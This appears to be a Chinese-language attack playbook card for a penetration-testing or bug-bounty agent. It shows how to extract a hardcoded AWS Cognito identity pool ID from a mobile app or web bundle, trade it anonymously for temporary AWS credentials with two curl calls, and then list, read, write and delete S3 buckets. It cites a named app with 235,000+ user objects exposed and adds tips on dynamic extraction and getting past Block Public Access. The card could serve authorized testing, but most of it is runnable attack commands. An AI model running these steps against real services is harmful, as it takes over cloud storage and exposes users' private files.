---
name: cognito-anon-pool-s3-takeover
description: >-
  Use when 移动 App/SPA 里挖到硬编码 AWS Cognito IdentityPoolId 且允许未认证身份：两步匿名取临时
  AWS 凭据 → 打 S3 桶（列举/读/写/删）。含 AK 里的 .so/二进制提取、GetId+GetCredentialsForIdentity、
  权限边界判定、23 万对象级量的口径。
---

# Cognito 匿名身份池 → 临时 AWS 凭据 → S3 全量接管

实战来源：HushChat/KingKong（2026-08），`libne_encrypt.so` 硬编码 IdentityPoolId，匿名取到带 S3 全权限的 STS 凭据，11 个桶、23.5 万+ 用户对象可读写删。

## When to Use

- 目标是 App / SPA，用 AWS（API 域名 `execute-api.*.amazonaws.com`、桶名 `*.s3.*.amazonaws.com`）
- 反编译后在 `.so` / `assets` / JS bundle 里看到 `ap-xxxx-N:uuid` 形态的字符串（`IdentityPoolId`）
- 前端 JS 里出现 `CognitoIdentityServiceProvider`、`AWS.config.credentials`、`fromCognitoIdentityPool`

## 1. 找池子 ID（三处都翻）

```bash
# APK
unzip -o app.apk -d apk && strings -a apk/lib/*/*.so apk/assets/* 2>/dev/null | grep -E '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}'
# IPA
strings -a Payload/*.app/* 2>/dev/null | grep -E '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}'
# Web
curl -s https://目标/ | grep -oE '[a-z]{2}-[a-z]+-[0-9]:[0-9a-f-]{36}' ; grep -rE 'IdentityPoolId' static/js/*.js
```

- 格式：`区域:UUID`，如 `ap-southeast-1:da09aa05-...`
- 同时记区域，后面所有请求都打到 `cognito-identity.<region>.amazonaws.com`

## 2. 两步匿名取凭据

```bash
# Step 1 - GetId（匿名身份，不需要任何 token）
curl -s -X POST https://cognito-identity.ap-southeast-1.amazonaws.com/ \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AWSCognitoIdentityService.GetId' \
  -d '{"IdentityPoolId":"<POOL_ID>"}'
# → {"IdentityId":"ap-southeast-1:xxxx-..."}

# Step 2 - GetCredentialsForIdentity（IdentityId 直接换 STS）
curl -s -X POST https://cognito-identity.ap-southeast-1.amazonaws.com/ \
  -H 'Content-Type: application/x-amz-json-1.1' \
  -H 'X-Amz-Target: AWSCognitoIdentityService.GetCredentialsForIdentity' \
  -d '{"IdentityId":"<上一步的 IdentityId>"}'
# → {"Credentials":{"AccessKeyId":"ASIA...","SecretKey":"...","SessionToken":"..."}}
```

- 若返回 `NotAuthorizedException: Unauthenticated access is not supported` → 池子关了匿名，换 `GetOpenIdToken` 走登录用户路径
- 凭据默认 1 小时，过期重新走两步

## 3. 用凭据打 S3

```bash
export AWS_ACCESS_KEY_ID=ASIA... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... AWS_DEFAULT_REGION=ap-southeast-1
aws sts get-caller-identity          # 看角色 ARN，判断属于哪套系统
aws s3 ls                            # 列账号下所有桶（往往比预期多）
aws s3 ls s3://<bucket>/ --recursive --summarize | tail -3
```

- 读：`aws s3 cp s3://<bucket>/<key> .`
- 写/删只做**最小验证**：放一个 `zz_probe.txt`、删掉自己那个，别动真实对象
- 对象量口径：`--summarize` 的 `Total Objects` / `Total Size`，报告里给这两个数

## 4. 判断权限边界（写报告前必做）

```bash
aws iam get-role --role-name <从 sts 拿到的角色名> 2>/dev/null   # 多半无权
aws s3api get-bucket-acl --bucket <b>
aws s3api get-bucket-policy --bucket <b>
```

- 三种常见边界：只读单桶 / 全账号读 / 全账号读写删
- 全账号读写删是最坏情况（用户上传的证件/头像/聊天媒体全部可改）→ 报告定级 Critical

## 坑

1. IdentityPoolId 常同时出现在 iOS 主二进制与 Android `.so` 的**加密字符串表**里，`strings` 抓不到就上 IDA / `jnitrace` 动态取
2. `GetCredentialsForIdentity` 有时要求带 `Logins` 或 `Token`，匿名池不用；报 `InvalidIdentityPoolConfigurationException` 说明池子没配角色
3. 有些桶开了 Block Public Access，但 STS 凭据走的是 IAM 角色 → **照样能读**，别被「公开访问已阻止」骗
4. 大桶列举会烧钱/超时，用 `--page-size 1000` + 只列前几层

## 相关卡

- `anonymous-object-storage-access` — 桶本身公开的判定
- `object-storage-takeover-mining` — 拿到凭据后的挖矿式清点
- `cloud-metadata-harvesting` — 有 SSRF 时走元数据取同族凭据
